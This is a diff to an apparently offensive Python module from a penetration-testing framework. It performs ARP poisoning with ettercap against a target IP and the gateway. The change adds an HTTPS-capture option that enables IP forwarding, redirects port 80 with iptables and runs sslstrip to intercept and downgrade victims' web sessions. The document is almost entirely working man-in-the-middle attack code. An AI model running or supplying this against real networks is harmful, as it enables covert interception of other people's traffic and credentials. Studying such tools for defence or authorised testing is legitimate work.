@@ -14,11 +14,11 @@ import commands
 # INFORMATION MODULE
 def init():
 	init.Author             ="RedToor"
-	init.Version            ="3.0"
+	init.Version            ="3.1"
 	init.Description        ="ARP Poisoning"
 	init.CodeName           ="net/at.arpsp"
 	init.DateCreation       ="26/08/2015"      
-	init.LastModification   ="03/06/2016"
+	init.LastModification   ="27/07/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -28,18 +28,27 @@ def init():
 		# NAME      VALUE            RQ     DESCRIPTION
 		'interface':["eth0"         ,True ,'Interface'],
 		'target'   :["192.168.1.223",True ,'Target IP'],
-		'gateway'  :[get_gateway()  ,True ,'Gateway IP']
+		'gateway'  :[get_gateway()  ,True ,'Gateway IP'],
+		'https'    :[True           ,False,'HTTP/s Capture']
 	}
 	return init
 # END INFORMATION MODULE
 
 # CODE MODULE    ############################################################################################
 def main(run):
-
 	if isConect() and checkDevice(init.var['interface']):
-		printAlert(0,"Starting ARP Poisoning...")
+		printAlert(0,"Starting ARP Poisoning [ettercap].")
+		commands.getoutput("iptables --flush -t nat")
 		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
+		if init.var['https']:
+			printAlert(0,"Starting SSL Capturing [sslstrip].")
+			commands.getoutput("sudo fuser -kuv 10000/tcp  >/dev/null 2>&1 ")
+			commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
+			commands.getoutput("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+			Subprocess("sslstrip")
 		raw_input(printAlert(8,"Stop Attack ARP (PRESS ANY KEY)\n"))
-		commands.getoutput("killall ettercap")	
+		commands.getoutput("killall ettercap")
+		commands.getoutput("killall sslstrip")
+		commands.getoutput("iptables --flush -t nat")
 
 # END CODE MODULE ############################################################################################
